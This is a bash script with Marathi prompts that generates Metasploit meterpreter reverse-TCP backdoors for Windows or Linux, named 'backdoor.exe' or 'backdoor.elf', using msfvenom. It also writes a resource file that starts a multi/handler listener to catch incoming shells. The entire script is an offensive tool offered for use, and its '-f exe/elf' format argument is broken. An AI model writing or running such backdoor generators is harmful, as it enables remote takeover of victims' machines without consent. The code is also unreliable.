#!/bin/bash

echo "============================================="
echo "        METASPLOIT PAYLOAD HELPER            "
echo "============================================="

# युझरकडून आवश्यक माहिती घेणे
read -p "तुमचा (LHOST) IP Address टाका: " lhost
read -p "तुमचा (LPORT) Port टाका (उदा. 4444): " lport

echo -e "\nकोणत्या प्रकारचा पेलोड बनवायचा आहे?"
echo "1) Windows (Reverse TCP)"
echo "2) Linux (Reverse TCP)"
read -p "पर्याय निवडा (1 किंवा 2): " choice

if [ "$choice" -eq 1 ]; then
    payload="windows/meterpreter/reverse_tcp"
    output_file="backdoor.exe"
elif [ "$choice" -eq 2 ]; then
    payload="linux/x64/meterpreter/reverse_tcp"
    output_file="backdoor.elf"
else
    echo "चुकीचा पर्याय!"
    exit 1
fi

echo -e "\n[*] msfvenom वापरून पेलोड तयार होत आहे..."
msfvenom -p $payload LHOST=$lhost LPORT=$lport -f exe/elf -o $output_file

if [ $? -eq 0 ]; then
    echo "[+] पेलोड यशस्वीरित्या तयार झाला: $output_file"
else
    echo "[!] पेलोड तयार करताना एरर आली. Metasploit इंस्टॉल आहे का ते तपासा."
    exit 1
fi

# ऑटोमॅटिक Listener साठी रिसोर्स फाईल (.rc) तयार करणे
echo -e "\n[*] Listener सेट करत आहे..."
rc_file="listener.rc"
echo "use exploit/multi/handler" > $rc_file
echo "set PAYLOAD $payload" >> $rc_file
echo "set LHOST $lhost" >> $rc_file
echo "set LPORT $lport" >> $rc_file
echo "set ExitOnSession false" >> $rc_file
echo "exploit -j" >> $rc_file

echo "[+] रिसोर्स फाईल तयार झाली: $rc_file"
echo -e "\n[*] Listener सुरू करण्यासाठी ही कमांड वापरा: msfconsole -r $rc_file"
